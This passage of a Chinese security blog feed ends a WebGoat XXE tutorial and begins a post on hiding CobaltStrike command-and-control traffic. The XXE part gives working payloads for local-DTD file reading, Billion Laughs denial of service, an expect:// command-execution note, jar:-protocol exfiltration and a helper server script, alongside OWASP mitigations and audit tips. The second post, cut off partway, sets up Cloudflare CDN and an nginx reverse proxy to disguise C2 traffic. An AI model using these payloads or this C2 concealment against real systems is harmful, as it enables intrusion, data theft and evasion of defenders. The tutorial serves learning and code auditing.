punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样一来先用 <code>aaa)&gt;</code>闭合之前的标签，然后再引入新的参数实体，最后使用<code>&lt;!ENTITY aa(bb</code>闭合末尾标签(类似XSS)，结果起来就跟使用外部实体一样的了，在xml中的定义是一个字符串，符号实体编码会在引用时自动解码，所以单引号转为了<code>&amp;#x27;</code>；百分号转为了<code>&amp;#x26;#x25;</code>，解码一次后还原为<code>&amp;#x25;</code>，再次引用时就还原到参数实体的<code>%</code>了 。</p><p>如何查找这些可利用的本地DTD?在<a href="https://github.com/GoSecure/dtd-finder/releases/download/1.1/dtd-finder-1.1-all.jar">github</a>上有一个可利用的工具，使用<code>java -jar dtd-finder-1.1-all.jar xxx.jar</code>，这里找了一个jboss的安装包进行扫描，存在一个可利用的dtd：<br><img src="https://i.loli.net/2021/08/17/LH9EhdorAZcbRiG.png"><br>POC中加上jar协议读取压缩文件,直接在错误中获得文件内容回显:<br><img src="https://i.loli.net/2021/08/17/kSU3ycsEtpaXqng.png"></p><p>windows中默认存在一个可利用的dtd<code>C:\Windows\System32\wbem\xml\cim20.dtd</code>：</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">SuperClass</span> <span class="token attr-name">'</span><span class="token punctuation">></span></span>Your DTD code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">test</span> <span class="token attr-name">"test"'</span><span class="token punctuation">></span></span>%local_dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当然了，将这个<code>C:\Windows\System32\wbem\xml</code>打包成zip，使用工具扫描一波：<br><img src="https://i.loli.net/2021/08/17/DTtkgozCqHjnP1A.png"><br>直接利用：<br><img src="https://i.loli.net/2021/08/17/hioutIApfRKBsX9.png"></p><p><em>XXE DOS</em><br>一个多重实体嵌套的例子：</p><pre class="line-numbers language-dts"><code class="language-dts"><?xml version="1.0"?><!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ELEMENT lolz (#PCDATA)> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外在一些JSON格式的请求中可以尝试修改请求头<code>Content-Type: application/xml</code>，可对JSON接口进行XXE测试。</p><p><strong>XXE协议支持</strong><br>使用网上的一张图来描述：<br><img src="https://i.loli.net/2021/08/09/LhWV7beiMR8cpOq.png"><br>PHP中一些协议利用，如PHP开启了expect支持可以进行RCE，PHP XXE RCE:<br>having the PHP Expect module installed can result in code execution from an XXE attack (<!--ENTITY rce SYSTEM “expect://ifconfig” -->).</p><p>JAVA中jar协议的使用方法：</p><pre class="line-numbers language-groovy"><code class="language-groovy">local <span class="token operator">=</span><span class="token operator">></span> jar<span class="token punctuation">:</span>file<span class="token punctuation">:</span><span class="token string">//</span><span class="token string">/var/</span>myarchive<span class="token operator">.</span>zip<span class="token operator">!</span><span class="token operator">/</span>file<span class="token operator">.</span>txtremote <span class="token operator">=</span><span class="token operator">></span> jar<span class="token punctuation">:</span>https<span class="token punctuation">:</span><span class="token string">//</span>download<span class="token operator">.</span>host<span class="token operator">.</span>com<span class="token string">/myarchive.zip!/</span>file<span class="token operator">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用jar协议外带数据：<br><img src="https://i.loli.net/2021/08/09/qUa7jxLB5AvMX4V.png"><br>利用jar协议下载临时文件：<br><img src="https://i.loli.net/2021/08/16/V2xt4RdsBUQAEie.png"><br>利用zip中不存在的文件引发报错，抛出临时文件路径(一般默认是用户temp下,Linux默认在容器temp)：<br><img src="https://i.loli.net/2021/08/16/bnmlHqNKrLFJ35y.png"><br>这是一个用来在传输中进行延时的脚本,通过<code>python x.py x.zip</code>使用(x.zip末尾添加00垃圾字符):</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys <span class="token keyword">import</span> time <span class="token keyword">import</span> threading <span class="token keyword">import</span> socketserver <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote <span class="token keyword">import</span> http<span class="token punctuation">.</span>client <span class="token keyword">as</span> httpc listen_host <span class="token operator">=</span> <span class="token string">'localhost'</span> listen_port <span class="token operator">=</span> <span class="token number">9999</span> jar_file <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">JarRequestHandler</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        http_req <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'New connection:'</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>client_address<span class="token punctuation">)</span>        <span class="token keyword">while</span> b<span class="token string">'\r\n\r\n'</span> <span class="token operator">not</span> <span class="token keyword">in</span> http_req<span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                http_req <span class="token operator">+=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\r\nClient req:\r\n'</span><span class="token punctuation">,</span>http_req<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                jf <span class="token operator">=</span> open<span class="token punctuation">(</span>jar_file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>                contents <span class="token operator">=</span> jf<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                headers <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token triple-quoted-string string">'''HTTP/1.0 200 OK\r\n'''</span>                <span class="token triple-quoted-string string">'''Content-Type: application/java-archive\r\n\r\n'''</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>headers<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>contents<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>contents<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"get error at:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    jarserver <span class="token operator">=</span> socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>listen_host<span class="token punctuation">,</span>listen_port<span class="token punctuation">)</span><span class="token punctuation">,</span> JarRequestHandler<span class="token punctuation">)</span>     <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'waiting for connection...'</span><span class="token punctuation">)</span>     server_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>jarserver<span class="token punctuation">.</span>serve_forever<span class="token punctuation">)</span>     server_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>     server_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>     server_thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果支持netdoc，可以列目录：</p><pre class="line-numbers language-groovy"><code class="language-groovy">netdoc<span class="token punctuation">:</span><span class="token string">//</span><span class="token operator">/</span>tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="XXE代码审计"><a href="#XXE代码审计" class="headerlink" title="XXE代码审计"></a>XXE代码审计</h1><p>随便找到一个XXE位置，比如当前的提交是在POST路由<code>xxe/blind</code>中，大概的流程如图注释：<br><img src="https://i.loli.net/2021/08/16/BG4I7Z8beJDnQPr.png"><br>主要的XML解析在<code>comments.parseXml</code>中，，所以可以右键parseXml选择转到实现：<br><img src="https://i.loli.net/2021/08/16/5kBpiw9Vle3JnLh.png"><br>parseXML是类Comments的一个方法，通过使用<code>javax.xml.stream.XMLInputFactory</code>和<code>javax.xml.bind.JAXBContext</code>处理XML后返回评论的内容，明显可以看到解析类的使用以及内置的缓解方法:<br><img src="https://i.loli.net/2021/08/16/Hd3ZS69DranPTxC.png"><br>内置的缓解代码通过设置JDK中XMLConstants类属性<code>ACCESS_EXTERNAL_DTD</code>和<code>ACCESS_EXTERNAL_SCHEMA</code>，在<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP备忘录</a>中有详细记录：</p><pre class="line-numbers language-java"><code class="language-java"> <span class="token comment" spellcheck="true">// 设置允许对指定协议的外部DTD和外部实体引用的访问。</span>xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_DTD<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_SCHEMA<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>直接patch代码，开启安全措施：<br><img src="https://i.loli.net/2021/08/16/su3F517QNvhPHl4.png"><br>这里错误提示为“无法读取外部文档 ‘note.dtd’, 因为 accessExternalDTD 属性设置的限制导致不允许 ‘http’ 访问”，这两个属性在JDK中的说明如下：<br><img src="https://i.loli.net/2021/08/16/T1Fd73eHgLhOl9c.png"><br>也就是这是一个白名单的设置，可以设置一些允许的协议，这里尝试允许<code>file://</code>：</p><pre class="line-numbers language-java"><code class="language-java">xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_DTD<span class="token punctuation">,</span> <span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_SCHEMA<span class="token punctuation">,</span> <span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/16/lqAS6e7nh8Zk3fi.png"><br>再来看XMLInputFactory类中安全设置，这里抛出的是“引用了实体 “r”, 但未声明它。”异常:</p><pre class="line-numbers language-java"><code class="language-java">xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>SUPPORT_DTD<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//完全禁用DTD支持</span>xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>IS_SUPPORTING_EXTERNAL_ENTITIES<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//禁用外部实体</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里实验开启DTD支持，但禁用外部实体，parseXml返回为””，<code>CONTENTS.contains(comment.getText())</code>会返回true:</p><pre class="line-numbers language-java"><code class="language-java">xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>SUPPORT_DTD<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> xif<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>IS_SUPPORTING_EXTERNAL_ENTITIES<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//禁用外部实体</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/16/QMokdWAZVH8fjya.png"><br>这里的parseXml虽然返回的为””，总体来说还是返回了comment这个类，parseXml返回的只是comment.text，所以这里contains并没有异常，返回了true，等于说<code>CONTENTS.contains("")</code>返回true，参考<a href="https://blog.csdn.net/q563730343/article/details/82149601">Java Contains()方法传入空（非null）字符串的返回结果</a>。<br>所以这里读取空文件也可以让contains返回true:<br><img src="https://i.loli.net/2021/08/16/dia6U8Z7z5hyYpX.png"></p><p>经过上面的分析，在代码审计中寻找XXE漏洞，可以通过关键字寻找XML处理类的使用，并检查是否设置了安全限制(setProperty、setAttribute、setXIncludeAware、setExpandEntityReferences、setFeature)：<br>XMLInputFactory（StAX 解析器）</p><pre class="line-numbers language-java"><code class="language-java"> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>XMLInputFactory <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">// This disables DTDs entirely for that factory</span>xmlInputFactory<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLInputFactory<span class="token punctuation">.</span>SUPPORT_DTD<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// disable external entities</span>xmlInputFactory<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"javax.xml.stream.isSupportingExternalEntities"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>XMLConstants (包含基本 XML 值作为常量的实用程序类，可用于设置XML安全属性)</p><pre class="line-numbers language-java"><code class="language-java">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>XMLConstants<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_DTD<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>XMLConstants<span class="token punctuation">.</span>ACCESS_EXTERNAL_SCHEMA<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>常见XML解释类：</p><pre class="line-numbers language-java"><code class="language-java">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>XMLInputFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>JAXBContextjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>DocumentBuilderFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>parsers<span class="token punctuation">.</span>SAXParserjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>TransformerFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>Validatorjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>validation<span class="token punctuation">.</span>SchemaFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>SAXTransformerFactoryjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>SAXSourceorg<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>XMLReaderDocumentHelper<span class="token punctuation">.</span>parseTextDocumentBuilderorg<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>helpers<span class="token punctuation">.</span>XMLReaderFactoryorg<span class="token punctuation">.</span>dom4j<span class="token punctuation">.</span>io<span class="token punctuation">.</span>SAXReaderorg<span class="token punctuation">.</span>jdom<span class="token punctuation">.</span>input<span class="token punctuation">.</span>SAXBuilderorg<span class="token punctuation">.</span>jdom2<span class="token punctuation">.</span>input<span class="token punctuation">.</span>SAXBuilderjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>Unmarshallerjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>XpathExpressionjavax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>XMLStreamReaderorg<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>digester3<span class="token punctuation">.</span>Digesterorg<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>SAXParseExceptionpublicId<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就针对性的对xml处理的位置进行跟踪，查看关键代码是否进行了安全处理。</p><p>更多详情：<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a><br><a href="https://www.ajsafe.com/news/185.html">XXE漏洞原理及利用</a><br><a href="https://gosecure.github.io/xxe-workshop/#7">Advanced XXE Exploitation</a><br><a href="https://blog.noob.ninja/spilling-local-files-via-xxe-when/">本地DTD利用</a><br><a href="https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_5">微信XXE修复</a><br><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack">XXE拒绝服务攻击Billion Laughs</a><br><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">OWASP XML 外部实体预防</a><br><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">利用本地 DTD 文件利用 XXE</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webgoat </tag>
            
            <tag> XXE </tag>
            
            <tag> IDEA调试 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike流量伪装与安全配置</title>
      <link href="/2021/08/19/cobaltstrike-liu-liang-yin-cang-yu-an-quan-pei-zhi/"/>
      <url>/2021/08/19/cobaltstrike-liu-liang-yin-cang-yu-an-quan-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CobaltStrike在使用过程中经常会涉及到一些安全隐藏方面的配置，我使用的方案是CDN加上nginx转发，再使用profile来修改流量特征，本文对一些细节上的点进行记录，方便以后查阅。首先是域名和CDN上的配置，然后是CobaltStrike一些证书、profile的配置，最后是前置服务器(nginx)的一些配置方法。</p><h2 id="CDN和域名相关配置"><a href="#CDN和域名相关配置" class="headerlink" title="CDN和域名相关配置"></a>CDN和域名相关配置</h2><p>在freenom申请测试域名(google.tk)后，到cloudflare中获取名称服务器地址:<br><img src="https://i.loli.net/2021/08/05/gYbmjWcxEZJnOFh.png"><br>然后在freenom中配置:<br><img src="https://i.loli.net/2021/08/05/amWJj8v31VLpd5i.png"></p><p><img src="https://i.loli.net/2021/08/05/DUxprVQndS9sc8A.png"><br>CDN中配置A记录，解析IP，并使用代理：<br><img src="https://i.loli.net/2021/08/10/rytjsFLmpWhCDN3.png"><br>这样就能使用cloudflare的CDN加速了，然后开启nginx，配置server_name，访问：<br><img src="https://i.loli.net/2021/08/05/4SGJMUNEm3P18Li.png"></p><p>接下来为域名配置源服务器证书，选择创建证书：<br><img src="https://i.loli.net/2021/08/05/H1fLYowxcvXWaP7.png"></p><p><img src="https://i.loli.net/2021/08/05/clJkq84tH65aoxG.png"><br>将获取到的证书和key文件配置在nginx中，在ubuntu上修改nginx配置文件 <code>/etc/nginx/nginx.conf</code>：：</p><pre class="line-numbers language-groovy"><code class="language-groovy">server <span class="token punctuation">{</span>    listen <span class="token number">443</span> ssl<span class="token punctuation">;</span>    server_name m<span class="token operator">.</span>test<span class="token operator">.</span>com<span class="token punctuation">;</span>    ssl_certificate  key<span class="token operator">/</span>xxx<span class="token operator">.</span>com_ssl<span class="token operator">.</span>pem<span class="token punctuation">;</span>    ssl_certificate_key key<span class="token operator">/</span>xxx<span class="token operator">.</span>com_key<span class="token punctuation">;</span>    ssl_session_timeout 5m<span class="token punctuation">;</span>    ssl_ciphers TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">256</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA384<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>CHACHA20<span class="token operator">-</span>POLY1305<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>CCM<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>CCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>CHACHA20<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES128<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES128<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES256<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>3DES<span class="token punctuation">:</span>RSA<span class="token operator">+</span>3DES<span class="token punctuation">:</span><span class="token operator">!</span>MD5<span class="token punctuation">;</span>        ssl_protocols TLSv1<span class="token operator">.</span><span class="token number">1</span> TLSv1<span class="token operator">.</span><span class="token number">2</span> TLSv1<span class="token operator">.</span><span class="token number">3</span><span class="token punctuation">;</span>    ssl_prefer_server_ciphers on<span class="token punctuation">;</span>    location <span class="token operator">/</span> <span class="token punctuation">{</span>        root <span class="token string">/var/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span>        index index<span class="token operator">.</span>html index<span class="token operator">.</span>htm<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置好了 <code>nginx -t</code> 检查,然后<code>nginx -s reload</code>重载配置:<br><img src="https://i.loli.net/2021/08/05/TCl2UMb9B1JQj7p.png"></p><p>证书配置好以后，在cloudflare中将SSL/TLS加密模式设置为严格：<br><img src="https://i.loli.net/2021/08/05/8b4o6EtMmQviIkx.png"><br>访问域名，严格的https已经启用，从客户端到CDN，CDN到服务器全部使用HTTPS：<br><img src="https://i.loli.net/2021/08/05/jzmSAcKO6NPxron.png"></p><h2 id="nginx的反向代理配置"><a href="#nginx的反向代理配置" class="headerlink" title="nginx的反向代理配置"></a>nginx的反向代理配置</h2><p>反向代理配置就是匹配到特定的路径时，nginx将流量转发到后端的CobaltStrike处理，主要有四个路径，用于心跳和接收命令的GET包，用于返回命令执行结果等的POST包，剩下两个是x86和x64的stager，然后匹配到了就使用proxy_pass转发，比如后面会用到jq的profile，在profile中很容易找到这些url，然后配置nginx.conf关键部分如下：</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">443</span> <span class="token keyword">ssl</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#要处理的域名</span>    <span class="token keyword">server_name</span> m<span class="token punctuation">.</span>test<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#证书</span>    <span class="token keyword">ssl_certificate</span>  key<span class="token operator">/</span>xxx<span class="token punctuation">.</span>com_ssl<span class="token punctuation">.</span>pem<span class="token punctuation">;</span>    <span class="token keyword">ssl_certificate_key</span> key<span class="token operator">/</span>xxx<span class="token punctuation">.</span>com_key<span class="token punctuation">;</span>    <span class="token keyword">ssl_session_timeout</span> 5m<span class="token punctuation">;</span>    <span class="token keyword">ssl_ciphers</span> TLS13<span class="token operator">-</span>AES<span class="token number">-256</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA384<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>CHACHA20<span class="token operator">-</span>POLY1305<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token number">-128</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token number">-128</span><span class="token operator">-</span>CCM<span class="token number">-8</span><span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token number">-128</span><span class="token operator">-</span>CCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>CHACHA20<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES128<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES128<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES256<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>3DES<span class="token punctuation">:</span>RSA<span class="token operator">+</span>3DES<span class="token punctuation">:</span><span class="token operator">!</span>MD5<span class="token punctuation">;</span>        <span class="token keyword">ssl_protocols</span> TLSv1<span class="token number">.1</span> TLSv1<span class="token number">.2</span> TLSv1<span class="token number">.3</span><span class="token punctuation">;</span>    <span class="token 